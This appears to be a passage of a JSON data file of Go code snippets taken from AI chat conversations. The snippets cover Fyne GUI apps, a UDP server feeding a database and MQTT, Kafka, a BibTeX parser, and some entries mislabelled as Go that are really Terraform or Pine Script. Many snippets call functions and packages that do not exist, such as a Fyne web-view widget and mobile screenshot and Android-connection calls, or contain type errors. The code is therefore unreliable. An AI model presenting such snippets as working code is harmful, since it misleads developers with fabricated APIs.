content,\n\t\tcontainer.NewVBox(\n\t\t\tlayout.NewSpacer(),\n\t\t\tstatus,\n\t\t\tbutton,\n\t\t\tcontent,\n\t\t\tlayout.NewSpacer(),\n\t\t),\n\t}\n}\n\nvar q *qrCodeScanner\n\nfunc main() {\n\tq = newQRCodeScanner()\n\n\ta := app.NewWithDriver(&mobile{})\n\tw := a.NewWindow(\"QR Code Scanner\")\n\tw.Resize(fyne.NewSize(400, 400))\n\tw.SetContent(container.NewMax(q))\n\tw.ShowAndRun()\n}\n\ntype mobile struct{}\n\nfunc (m *mobile) CreateWindow(_ fyne.App) fyne.Window                     { panic(\"Not implemented\") }\nfunc (m *mobile) Run()                                                      { panic(\"Not implemented\") }\nfunc (m *mobile) Quit()                                                     { panic(\"Not implemented\") }\nfunc (m *mobile) Render(_ fyne.Canvas)                                       { panic(\"Not implemented\") }\nfunc (m *mobile) ShowKeyboard(_ fyne.Canvas)                                 { panic(\"Not implemented\") }\nfunc (m *mobile) HideKeyboard()                                              { panic(\"Not implemented\") }\nfunc (m *mobile) SetScreenOrientation(_ fyne.ScreenOrientation)              { panic(\"Not implemented\") }\nfunc (m *mobile) ScreenOrientation() fyne.ScreenOrientation                  { panic(\"Not implemented\") }\nfunc (m *mobile) SetOnScreen(_ fyne.Layer)                                   { panic(\"Not implemented\") }\nfunc (m *mobile) Cursor() fyne.Cursor                                        { panic(\"Not implemented\") }\nfunc (m *mobile) NewCustomPainter(_ func(w fyne.Window) fyne.CanvasObject) fyne.CustomPainter {\n\tpanic(\"Not implemented\")\n}\n\ntype appState struct {\n\tfocus fyne.FocusObject\n}\n\nfunc (s *appState) OnFocusChanged(_ fyne.FocusObject) {\n\tappStateManager.focus = s.focus\n}\n\nfunc (s *appState) Focus() fyne.FocusObject {\n\treturn s.focus\n}\n\ntype appStateManagerType struct {\n\tfocus fyne.FocusObject\n\tstate lifecycle.State\n}\n\nfunc (a *appStateManagerType) CurrentState() lifecycle.State {\n\treturn a.state\n}\n\nfunc (a *appStateManagerType) OnStart(s *lifecycle.State) {\n\ta.state = *s\n}\n\nfunc (a *appStateManagerType) OnStop() {\n\ta.state = lifecycle.StateDead\n}\n\nfunc (a *appStateManagerType) SetFocus(f fyne.FocusObject) {\n\ta.focus = f\n}\n\nvar appStateManager = &appStateManagerType{}\n\ntype myApplication struct {\n\tfyne.App\n}\n\nfunc (a *myApplication) CurrentState() lifecycle.State {\n\treturn lifecycle.StateAlive\n}\n\nfunc (a *myApplication) ObjectByName(n string) fyne.CanvasObject {\n\tif n == \"MainWindow\" {\n\t\treturn a.Driver().CanvasForObject(a.NewWindow(\"\"))\n\t}\n\treturn nil\n}\n\nfunc (a *myApplication) NewWindow(_ string) fyne.Window {\n\treturn a.Driver().CreateWindow(a)\n}\n\nfunc NewApp() fyne.App {\n\treturn &myApplication{fyne.NewApp()}\n}",
    "filename": "6b0535bc8b0dfdfa32a9fa40b92614e0_7.go"
  },
  {
    "conversation_hash": "07fcd148098c373b5bac5eb42dc067bd",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fyne.io/fyne\"\n    \"fyne.io/fyne/app\"\n    \"fyne.io/fyne/widget\"\n)\n\nfunc main() {\n    myApp := app.New()\n    myWindow := myApp.NewWindow(\"Web Browser\")\n\n    webView := widget.NewWebView()\n    webView.LoadURL(\"https://www.google.com\")\n\n    myWindow.SetContent(webView)\n    myWindow.Resize(fyne.NewSize(800, 600))\n    myWindow.ShowAndRun()\n}",
    "filename": "07fcd148098c373b5bac5eb42dc067bd_0.go"
  },
  {
    "conversation_hash": "07fcd148098c373b5bac5eb42dc067bd",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fyne.io/fyne/v2/app\"\n    \"fyne.io/fyne/v2/container\"\n    \"fyne.io/fyne/v2/widget\"\n)\n\nfunc main() {\n    myApp := app.New()\n    myWindow := myApp.NewWindow(\"Web Browser\")\n    myWindow.Resize(myWindow.Canvas().Size())\n\n    webView := widget.NewWebView()\n    webView.SetURL(\"https://www.google.com\")\n\n    myWindow.SetContent(container.NewMax(webView))\n    myWindow.ShowAndRun()\n}",
    "filename": "07fcd148098c373b5bac5eb42dc067bd_1.go"
  },
  {
    "conversation_hash": "6d1de9c3ff2358f22aea79c225e14aec",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"github.com/skip2/go-qrcode\"\n    \"fyne.io/fyne/app\"\n    \"fyne.io/fyne/widget\"\n)\n\nfunc main() {\n    a := app.New()\n    w := a.NewWindow(\"QR Code\")\n\n    qrcodeImg, _ := qrcode.Encode(\"Hello World\", qrcode.Medium, 256)\n\n    qrImg := widget.NewImageFromReader(bytes.NewReader(qrcodeImg))\n\n    content := widget.NewVBox(\n        qrImg,\n        widget.NewButton(\"Generate\", func() {\n            qrcodeImg, _ = qrcode.Encode(\"Hello World\", qrcode.Medium, 256)\n            qrImg.Resource = fyne.NewStaticResource(\"qrcode.png\", qrcodeImg)\n            w.SetContent(content)\n        }),\n    )\n\n    w.SetContent(content)\n    w.ShowAndRun()\n}",
    "filename": "6d1de9c3ff2358f22aea79c225e14aec_0.go"
  },
  {
    "conversation_hash": "6d1de9c3ff2358f22aea79c225e14aec",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"bytes\"\n\t\"encoding/base64\"\n\t\"image/jpeg\"\n\t\"log\"\n\n\t\"fyne.io/fyne/app\"\n\t\"fyne.io/fyne/canvas\"\n\t\"fyne.io/fyne/dialog\"\n\tfyneMobile \"fyne.io/fyne/mobile\"\n)\n\nvar (\n\tdata string\n)\n\nfunc main() {\n\ta := fyneapp.NewWithDriver(fyneMobile.New())\n\n\tw := a.NewWindow(\"QR Scanner\")\n\n\timg := canvas.NewImageFromFile(\"res/camera.png\")\n\n\timg.SetMinSize(fyne.NewSize(64, 64))\n\timg.OnTapped = func(_ *fyne.PointEvent) {\n\t\tdata = \"\"\n\t\tdefer func() {\n\t\t\tif data == \"\" {\n\t\t\t\treturn\n\t\t\t}\n\t\t\td := dialog.NewInformation(\"QR Code\", data, w)\n\t\t\td.Show()\n\t\t}()\n\n\t\tsrc, err := fyneMobile.RequestCameraPermission()\n\t\tif err != nil {\n\t\t\tlog.Println(err)\n\t\t\treturn\n\t\t}\n\n\t\timg, err := fyneMobile.TakeScreenshot(src)\n\t\tif err != nil {\n\t\t\tlog.Println(err)\n\t\t\treturn\n\t\t}\n\n\t\tbuf := new(bytes.Buffer)\n\t\tjpeg.Encode(buf, img, nil)\n\n\t\treader := base64.StdEncoding.Strict()\n\t\ts := reader.EncodeToString(buf.Bytes())\n\n\t\tdata = getQRCode(s)\n\t}\n\tw.SetContent(img)\n\n\tw.ShowAndRun()\n}\n\nfunc getQRCode(img string) string {\n\tconn, err := fyneMobile.NewAndroidConnection()\n\tif err != nil {\n\t\tlog.Println(err)\n\t\treturn \"\"\n\t}\n\tdefer conn.Close()\n\n\tqr, err := conn.ExecCommand(\"java -jar /sdcard/scan.jar\", bufio.NewReader(bytes.NewReader([]byte(img))))\n\tif err != nil {\n\t\tlog.Println(err)\n\t\treturn \"\"\n\t}\n\n\treturn qr\n}",
    "filename": "6d1de9c3ff2358f22aea79c225e14aec_2.go"
  },
  {
    "conversation_hash": "c279836347cd6b6ddf7ba2e179f58f42",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fyne.io/fyne/v2\"\n\t\"fyne.io/fyne/v2/app\"\n\t\"fyne.io/fyne/v2/container\"\n\t\"fyne.io/fyne/v2/scroller\"\n\t\"fyne.io/fyne/v2/widget\"\n)\n\nfunc main() {\n\tmyApp := app.New()\n\tmyWindow := myApp.NewWindow(\"Table Example\")\n\n\t// Prepare table data\n\tdata := [][]string{\n\t\t{\"Name\", \"Age\", \"Gender\"},\n\t\t{\"John\", \"34\", \"Male\"},\n\t\t{\"Jane\", \"28\", \"Female\"},\n\t\t{\"Bob\", \"42\", \"Male\"},\n\t\t{\"Alice\", \"21\", \"Female\"},\n\t}\n\n\t// Create table widget\n\ttable := widget.NewTableWithData(data)\n\n\t// Create header container and add table header to it\n\theader := container.NewHBox()\n\theader.Add(table.Headers...)\n\n\t// Create table container and add header and table to it\n\ttableContainer := container.NewVBox()\n\ttableContainer.Add(header)\n\ttableContainer.Add(table)\n\n\t// Wrap table container in a scroller\n\tscrollContainer := scroller.NewScrollContainer(tableContainer)\n\n\t// Set scroller size\n\tscrollContainer.SetMinSize(fyne.NewSize(400, 400))\n\n\t// Display the scroller\n\tmyWindow.SetContent(scrollContainer)\n\tmyWindow.ShowAndRun()\n}",
    "filename": "c279836347cd6b6ddf7ba2e179f58f42_0.go"
  },
  {
    "conversation_hash": "dd89ece792e075ccc9818349487215a3",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n)\n\ntype UDPServer struct {\n\taddress string\n}\n\nfunc NewUDPServer(addr string) *UDPServer {\n\treturn &UDPServer{address: addr}\n}\n\nfunc (s *UDPServer) ListenAndServe() error {\n\tudpAddr, err := net.ResolveUDPAddr(\"udp\", s.address)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"resolve udp address failed: %v\", err)\n\t}\n\n\tconn, err := net.ListenUDP(\"udp\", udpAddr)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"listen udp failed: %v\", err)\n\t}\n\n\tdefer conn.Close()\n\tbuffer := make([]byte, 1024)\n\n\tfor {\n\t\tn, addr, err := conn.ReadFromUDP(buffer)\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"read udp data from %s failed: %v\", addr.String(), err)\n\t\t\tcontinue\n\t\t}\n\n\t\tProcessReceivedData(buffer[:n], addr)\n\t}\n}",
    "filename": "dd89ece792e075ccc9818349487215a3_0.go"
  },
  {
    "conversation_hash": "dd89ece792e075ccc9818349487215a3",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"database/sql\"\n\t\"fmt\"\n\t_ \"github.com/DATA-DOG/go-sqlmock\"\n)\n\ntype Database struct {\n\tdb *sql.DB\n}\n\nfunc NewDatabase(dsn string) (*Database, error) {\n\tdb, err := sql.Open(\"dm\", dsn)\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"open database failed: %v\", err)\n\t}\n\n\treturn &Database{db: db}, nil\n}\n\nfunc (d *Database) InsertData(data string) error {\n\t_, err := d.db.Exec(\"INSERT INTO data (content) VALUES (?)\", data)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"insert data failed: %v\", err)\n\t}\n\treturn nil\n}",
    "filename": "dd89ece792e075ccc9818349487215a3_1.go"
  },
  {
    "conversation_hash": "dd89ece792e075ccc9818349487215a3",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\tmqtt \"github.com/eclipse/paho.mqtt.golang\"\n)\n\ntype MQTTClient struct {\n\tclient mqtt.Client\n}\n\nfunc NewMQTTClient(broker string, clientID string) (*MQTTClient, error) {\n\topts := mqtt.NewClientOptions().AddBroker(broker).SetClientID(clientID)\n\tclient := mqtt.NewClient(opts)\n\tif token := client.Connect(); token.Wait() && token.Error() != nil {\n\t\treturn nil, fmt.Errorf(\"mqtt connect failed: %v\", token.Error())\n\t}\n\n\treturn &MQTTClient{client: client}, nil\n}\n\nfunc (m *MQTTClient) Publish(topic string, data string) error {\n\ttoken := m.client.Publish(topic, 0, false, data)\n\ttoken.Wait()\n\n\tif err := token.Error(); err != nil {\n\t\treturn fmt.Errorf(\"mqtt publish failed: %v\", err)\n\t}\n\treturn nil\n}",
    "filename": "dd89ece792e075ccc9818349487215a3_2.go"
  },
  {
    "conversation_hash": "dd89ece792e075ccc9818349487215a3",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"golang.org/x/sync/semaphore\"\n\t\"net\"\n\t\"sync\"\n)\n\ntype Worker struct {\n\tdb *Database\n\tmqtt *MQTTClient\n\tsema *semaphore.Weighted\n}\n\nfunc NewWorker(db *Database, mqtt *MQTTClient, maxWorkers int64) *Worker {\n\treturn &Worker{\n\t\tdb: db,\n\t\tmqtt: mqtt,\n\t\tsema: semaphore.NewWeighted(maxWorkers),\n\t}\n}\n\nfunc (w *Worker) ProcessReceivedData(data []byte, addr *net.UDPAddr) {\n\terr := w.sema.Acquire(context.Background(), 1)\n\tif err != nil {\n\t\tfmt.Printf(\"acquire semaphore failed: %v\", err)\n\t\treturn\n\t}\n\n\tgo w.handleWorker(data, addr)\n}\n\nfunc (w *Worker) handleWorker(data []byte, addr *net.UDPAddr) {\n\tdefer w.sema.Release(1)\n\tmsg := string(data)\n    \n\terr := w.db.InsertData(msg)\n\tif err != nil {\n\t\tfmt.Printf(\"insert data to database failed: %v\", err)\n\t\treturn\n\t}\n\n\terr = w.mqtt.Publish(\"data\", msg)\n\tif err != nil {\n\t\tfmt.Printf(\"publish mqtt message failed: %v\", err)\n\t\treturn\n\t}\n}",
    "filename": "dd89ece792e075ccc9818349487215a3_3.go"
  },
  {
    "conversation_hash": "dd89ece792e075ccc9818349487215a3",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nfunc main() {\n\tdb, err := NewDatabase(\"dm_user:dm_password@tcp(localhost:5236)/db_name\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tmqtt, err := NewMQTTClient(\"tcp://localhost:1883\", \"udp_server\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tserver := NewUDPServer(\":9000\")\n\tworker := NewWorker(db, mqtt, 100)\n\tserver.ProcessReceivedData = worker.ProcessReceivedData\n\n\terr = server.ListenAndServe()\n\tif err != nil {\n\t\tpanic(err)\n\t}\n}",
    "filename": "dd89ece792e075ccc9818349487215a3_4.go"
  },
  {
    "conversation_hash": "266805f1785fbdd23e56b06408f3e5c3",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"net\"\n\t\"os\"\n\t\"os/signal\"\n\t\"syscall\"\n)\n\nfunc main() {\n\t// 获取UDP地址\n\taddr, err := net.ResolveUDPAddr(\"udp\", \":8080\")\n\tif err != nil {\n\t\tlog.Fatalf(\"Error resolving address: %v\", err)\n\t}\n\t// 监听 UDP\n\tconn, err := net.ListenUDP(\"udp\", addr)\n\tif err != nil {\n\t\tlog.Fatalf(\"Error listening UDP: %v\", err)\n\t}\n\tdefer conn.Close()\n\n\t// 初始化数据库连接和 MQTT 客户端\n\tinitDbConnection()\n\tinitMqttClient()\n\n\t// 创建一个具有取消功能的带上下文的通道\n\tctx, cancel := context.WithCancel(context.Background())\n\n\t// 处理来自UDP服务器的数据\n\tgo handleUdpData(ctx, conn)\n\n\t// 等待 SIGINT 或 SIGTERM 信号\n\tquit := make(chan os.Signal, 1)\n\tsignal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)\n\n\t<-quit\n\tlog.Println(\"Shutting down...\")\n\tcancel()\n}",
    "filename": "266805f1785fbdd23e56b06408f3e5c3_0.go"
  },
  {
    "conversation_hash": "266805f1785fbdd23e56b06408f3e5c3",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"database/sql\"\n\t\"log\"\n\n\t_ \"github.com/dm-v6/dmsql/drivers\"\n)\n\nvar db *sql.DB\n\nfunc initDbConnection() {\n\tvar err error\n\tdb, err := sql.Open(\"dm\", \"userID:password@tcp(ip:port)/dbName\")\n\tif err != nil {\n\t\tlog.Fatalf(\"Error connecting to database: %v\", err)\n\t}\n\n\terr = db.Ping()\n\tif err != nil {\n\t\tlog.Fatalf(\"Error pinging database: %v\", err)\n\t}\n}\n\nfunc saveToDb(payload []byte) error {\n\t// 根据实际需求，示例声明一条 INSERT 语句\n\tquery := \"INSERT INTO your_table (column1) VALUES (?)\"\n\t_, err := db.Exec(query, payload)\n\n\treturn err\n}",
    "filename": "266805f1785fbdd23e56b06408f3e5c3_1.go"
  },
  {
    "conversation_hash": "266805f1785fbdd23e56b06408f3e5c3",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\n\tmqtt \"github.com/eclipse/paho.mqtt.golang\"\n)\n\nvar mqttClient mqtt.Client\n\nfunc initMqttClient() {\n\topts := mqtt.NewClientOptions().AddBroker(\"tcp://your.mqtt.broker:1883\").SetClientID(\"your-client-id\")\n\tmqttClient = mqtt.NewClient(opts)\n\tif token := mqttClient.Connect(); token.Wait() && token.Error() != nil {\n\t\tlog.Fatalf(\"Error connecting to MQTT broker: %v\", token.Error())\n\t}\n}\n\nfunc sendMqttMessage(payload []byte) error {\n\ttoken := mqttClient.Publish(\"your/topic\", 0, false, payload)\n\ttoken.Wait()\n\n\treturn token.Error()\n}",
    "filename": "266805f1785fbdd23e56b06408f3e5c3_2.go"
  },
  {
    "conversation_hash": "a951adb373ca9ab6b180e5fd5c9ed406",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "module \"account_a\" {\n  source      = \"./modules/account_a\"\n  vpc_cidr_block = \"10.0.0.0/16\"\n}\n\nmodule \"account_b\" {\n  source      = \"./modules/account_b\"\n  vpc_cidr_block = \"10.1.0.0/16\"\n}\n\nmodule \"account_c\" {\n  source      = \"./modules/account_c\"\n  vpc_cidr_block = \"10.2.0.0/16\"\n}",
    "filename": "a951adb373ca9ab6b180e5fd5c9ed406_1.go"
  },
  {
    "conversation_hash": "a951adb373ca9ab6b180e5fd5c9ed406",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "output \"account_a_vpc_id\" {\n  value = module.account_a.vpc_id\n}\n\noutput \"account_b_vpc_id\" {\n  value = module.account_b.vpc_id\n}\n\noutput \"account_c_vpc_id\" {\n  value = module.account_c.vpc_id\n}\n\noutput \"vpc_peering_connection_id_a_b\" {\n  value = module.account_a.vpc_peering_connection_id\n}\n\noutput \"vpc_peering_connection_id_a_c\" {\n  value = module.account_b.vpc_peering_connection_id\n}",
    "filename": "a951adb373ca9ab6b180e5fd5c9ed406_4.go"
  },
  {
    "conversation_hash": "a951adb373ca9ab6b180e5fd5c9ed406",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "resource \"aws_vpc\" \"vpc_a\" {\n  cidr_block = var.vpc_cidr_block\n  tags = {\n    Name = \"VPC-Account-A\"\n  }\n}\n\nresource \"aws_vpc_peering_connection\" \"peering_a_b\" {\n  vpc_id        = aws_vpc.vpc_a.id\n  peer_vpc_id   = var.peer_vpc_b_id\n}\n\nresource \"aws_vpc_peering_connection\" \"peering_a_c\" {\n  vpc_id        = aws_vpc.vpc_a.id\n  peer_vpc_id   = var.peer_vpc_c_id\n}",
    "filename": "a951adb373ca9ab6b180e5fd5c9ed406_5.go"
  },
  {
    "conversation_hash": "a951adb373ca9ab6b180e5fd5c9ed406",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "output \"vpc_id\" {\n  value = aws_vpc.vpc_a.id\n}\n\noutput \"vpc_peering_connection_id\" {\n  value = aws_vpc_peering_connection.peering_a_b.id\n}",
    "filename": "a951adb373ca9ab6b180e5fd5c9ed406_7.go"
  },
  {
    "conversation_hash": "a4eeaaad4995ef9fb914c7cbd08fcc29",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "kafka"
    ],
    "code": "package main\n\nimport (\n    \"github.com/segmentio/kafka-go\"\n    \"log\"\n)\n\nfunc main() {\n    // set up a kafka reader\n    reader := kafka.NewReader(kafka.ReaderConfig{\n        Brokers: []string{\"localhost:9092\"},\n        Topic: \"my-topic\",\n        GroupID: \"my-group\",\n        MinBytes: 10e3,\n        MaxBytes: 10e6,\n    })\n\n    // read messages from kafka\n    for {\n        m, err := reader.ReadMessage(context.Background())\n        if err != nil {\n            log.Println(\"error:\", err)\n            continue\n        }\n        log.Printf(\"message at offset %d: %s = %s\\n\", m.Offset, string(m.Key), string(m.Value))\n    }\n}",
    "filename": "a4eeaaad4995ef9fb914c7cbd08fcc29_0.go"
  },
  {
    "conversation_hash": "a4eeaaad4995ef9fb914c7cbd08fcc29",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\n\t\"github.com/goyy/goyacc\"\n)\n\ntype BibtexParser struct {\n\tentries []map[string]string\n}\n\nfunc (p *BibtexParser) getEntryByKey(key string) map[string]string {\n\tfor _, entry := range p.entries {\n\t\tif entry[\"key\"] == key {\n\t\t\treturn entry\n\t\t}\n\t}\n\treturn nil\n}\n\nfunc NewBibtexParser() *BibtexParser {\n\treturn &BibtexParser{\n\t\tentries: make([]map[string]string, 0),\n\t}\n}\n\n// Bibtex lexer tokens\nconst (\n\tENTRYTYPE  = \"ENTRYTYPE\"\n\tFIELDNAME  = \"FIELDNAME\"\n\tFIELDVALUE = \"FIELDVALUE\"\n\tCOMMA      = \"COMMA\"\n\tLBRACE     = \"LBRACE\"\n\tRBRACE     = \"RBRACE\"\n\tIDENTIFIER = \"IDENTIFIER\"\n\tSTRING     = \"STRING\"\n\tEQUALS     = \"EQUALS\"\n\tWHITESPACE = \"WHITESPACE\"\n)\n\nfunc (p *BibtexParser) Lex(l *goyacc.Lexer) goyacc.Token {\n\tfor {\n\t\tc := l.Next()\n\t\tif c == 0 {\n\t\t\treturn goyacc.Token{Type: goyacc.Eof}\n\t\t}\n\t\tswitch c {\n\t\tcase '@':\n\t\t\tl.Rewind()\n\t\t\treturn goyacc.Token{Type: ENTRYTYPE, Value: l.MatchRegexp(`@\\w+`)}\n\t\tcase ',':\n\t\t\treturn goyacc.Token{Type: COMMA}\n\t\tcase '{':\n\t\t\treturn goyacc.Token{Type: LBRACE}\n\t\tcase '}':\n\t\t\treturn goyacc.Token{Type: RBRACE}\n\t\tcase '=':\n\t\t\treturn goyacc.Token{Type: EQUALS}\n\t\tcase ' ', '\\t', '\\n':\n\t\t\tl.Skip()\n\t\t\treturn goyacc.Token{Type: WHITESPACE}\n\t\tcase '\\'':\n\t\t\treturn goyacc.Token{Type: FIELDVALUE, Value: l.MatchRegexp(`'([^\\\\']|\\\\.)*'`)}\n\t\tdefault:\n\t\t\tif c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' {\n\t\t\t\tl.Rewind()\n\t\t\t\tif l.Peek() == '\"' {\n\t\t\t\t\treturn goyacc.Token{Type: FIELDVALUE, Value: l.MatchRegexp(`\"[^\"]*\"`)}\n\t\t\t\t} else if s := l.MatchRegexp(`\\w+`); isIdentifier(s) {\n\t\t\t\t\treturn goyacc.Token{Type: FIELDNAME, Value: s}\n\t\t\t\t} else {\n\t\t\t\t\treturn goyacc.Token{Type: IDENTIFIER, Value: s}\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tpanic(fmt.Sprintf(\"illegal character: %q\", c))\n\t\t\t}\n\t\t}\n\t}\n}\n\nfunc isIdentifier(s string) bool {\n\tswitch s {\n\tcase \"author\", \"title\":\n\t\treturn true\n\tdefault:\n\t\treturn false\n\t}\n}\n\n// Bibtex parsing rules\nfunc (p *BibtexParser) ParseEntry(l *goyacc.Lexer) goyacc.Symbol {\n\tentryType := l.Peek(-1).Value\n\tl.Next() // consume the ENTRYTYPE token\n\n\t// Parse fields\n\tfields := make(map[string]string)\n\tfor {\n\t\tswitch l.Peek().Type {\n\t\tcase FIELDNAME:\n\t\t\tfieldName := l.Next().Value\n\t\t\tl.Expect(EQUALS)\n\t\t\tfieldValue := l.Next().Value\n\t\t\tfields[fieldName] = fieldValue\n\t\t\tif l.Peek().Type == COMMA {\n\t\t\t\tl.Next()\n\t\t\t}\n\t\tcase RBRACE:\n\t\t\tl.Next()\n\t\t\tp.entries = append(p.entries, map[string]string{\n\t\t\t\t\"entrytype\": entryType,\n\t\t\t\t\"fields\":    fields,\n\t\t\t})\n\t\t\treturn 0\n\t\tdefault:\n\t\t\tpanic(fmt.Sprintf(\"unexpected token: %s\", l.Peek()))\n\t\t}\n\t}\n}\n\nfunc main() {\n\tinput, err := ioutil.ReadFile(\"biblio.bib\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tparser := NewBibtexParser()\n\n\tif err := goyacc.ParseBytes(input, parser); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Printf(\"%+v\\n\", parser.entries)\n}",
    "filename": "a4eeaaad4995ef9fb914c7cbd08fcc29_3.go"
  },
  {
    "conversation_hash": "ca198a592fa4f1d8a7631f62c2d78c5d",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "// Define initial pivot high and pivot low levels\nph = ta.pivothigh(ipush, 3, 3)\npl = ta.pivotlow(ipush, 3, 3)\n\n// Define plotshape() labels for initial pivot levels\nplotshape(ph,'H',style = shape.labeldown, size = size.tiny,location = location.absolute,color=color.navy, text = 'H',textcolor = color.white,offset = -3)\nplotshape(pl,'L',style = shape.labelup, size= size.tiny, location = location.absolute,color = color.orange, text = 'L',textcolor = color.white,offset = -3)\n\n// Loop through real-time price data and update pivot levels\nvar float new_ph = na\nvar float new_pl = na\nif barstate.islast\n    new_ph := ta.pivothigh(ipush, 3, 3)\n    new_pl := ta.pivotlow(ipush, 3, 3)\n\n// Update pivot levels if they have changed\nif new_ph != ph\n    ph := new_ph\n    label.delete(\"ph\")\n    label.new(bar_index, ph, \"H\", xloc.bar_index, color.white, size = size.tiny, textcolor = color.navy, style = label.style_label_down, yloc.price, offset = -3, id = \"ph\")\n    \nif new_pl != pl\n    pl := new_pl\n    label.delete(\"pl\")\n    label.new(bar_index, pl, \"L\", xloc.bar_index, color.white, size = size.tiny, textcolor = color.orange, style = label.style_label_up, yloc.price, offset = -3, id = \"pl\")",
    "filename": "ca198a592fa4f1d8a7631f62c2d78c5d_1.go"
  },
  {
    "conversation_hash": "d66afc47f93dc5b06d12e41838274cf9",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n)\n\n// Сервис\ntype Service struct {\n    Name string\n    URL  string\n}\n\n// Реестр сервисов\ntype ServiceRegistry struct {\n    Services []*Service\n}\n\n// Добавление сервиса в реестр\nfunc (sr *ServiceRegistry) Register(service *Service) {\n    sr.Services = append(sr.Services, service)\n}\n\n// Получение сервиса из реестра\nfunc (sr *ServiceRegistry) Get(name string) *Service {\n    for _, s := range sr.Services {\n        if s.Name == name {\n            return s\n        }\n    }\n    return nil\n}\n\nfunc main() {\n    registry := ServiceRegistry{}\n\n    // Создание новых сервисов\n    service1 := &Service{\"service1\", \"http://127.0.0.1:8001\"}\n    service2 := &Service{\"service2\", \"http://127.0.0.2:8002\"}\n\n    // Регистрация сервисов в реестре\n    registry.Register(service1)\n    registry.Register(service2)\n\n    // Получение сервиса из реестра\n    s1 := registry.Get(\"service1\")\n    fmt.Println(s1.URL)\n}",
    "filename": "d66afc47f93dc5b06d12e41838274cf9_0.go"
  },
  {
    "conversation_hash": "f7f88a913df54707a4d6b381d43204c9",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"github.com/valyala/fasthttp\"\n)\n\ntype User struct {\n\tName string `json:\"name\"`\n\tAge  int    `json:\"age\"`\n}\n\nfunc main() {\n\t// 创建要发送的json数据\n\tuser := &User{Name: \"Alice\", Age: 27}\n\tjsonData, err := json.Marshal(user)\n\tif err != nil {\n\t\tfmt.Println(err.Error())\n\t\treturn\n\t}\n\n\t// 创建请求\n\trequest := fasthttp.AcquireRequest()\n\tdefer fasthttp.ReleaseRequest(request)\n\trequest.SetRequestURI(\"http://your-backend-api-url/path/to/endpoint\")\n\trequest.Header.SetMethod(\"POST\")\n\trequest.Header.Set(\"Content-Type\", \"application/json\")\n\trequest.SetBody(jsonData)\n\n\t// 发送请求\n\tresponse := fasthttp.AcquireResponse()\n\tdefer fasthttp.ReleaseResponse(response)\n\tclient := &fasthttp.Client{}\n\terr = client.Do(request, response)\n\tif err != nil {\n\t\tfmt.Println(err.Error())\n\t\treturn\n\t}\n\n\t// 处理响应\n\tbodyBytes := response.Body()\n\tfmt.Println(string(bodyBytes))\n}",
    "filename": "f7f88a913df54707a4d6b381d43204c9_0.go"
  },
  {
    "conversation_hash": "f140f3eca606b060b7e3c07830a566f5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"My Trading Strategy\", overlay=true)\n\n// Define inputs \nqty = input.float(title='Trade Size', defval=1.0)\nsl_percent = input.float(title='Stop Loss Percentage', defval=0.2, step=0.01)\ntp_percent = input.float(title='Take Profit Percentage', defval=0.2, step=0.01)\n\n// Define strategy variables\nentry_price = 0.0\nstop_loss = 0.0\ntake_profit = 0.0\ntrailing_stop = 0.0\n\n// Calculate initial levels\nstop_loss = qty * sl_percent\ntake_profit = qty * tp_percent\ntrailing_stop = qty * tp_percent\n\n// Buy and sell signals\nlong_signal = crossover(sma(close,20),sma(close,50))\nshort_signal = crossunder(sma(close,20),sma(close,50))\n\n// Submit trade orders\nif long_signal\n    if bar_index > 0\n        strategy.cancel_all()\n        strategy.entry(\"Buy\", strategy.long, qty=qty, comment=\"Buy\")\n        \n        entry_price := syminfo.ticker\n        stop_loss := entry_price - stop_loss\n        take_profit := entry_price + take_profit\n        trailing_stop := take_profit * 1.2\n        \n    strategy.exit(\"Stop Loss\", \"Buy\", stop=stop_loss, qty=qty, limit=entry_price, comment=\"Stop Loss\")\n    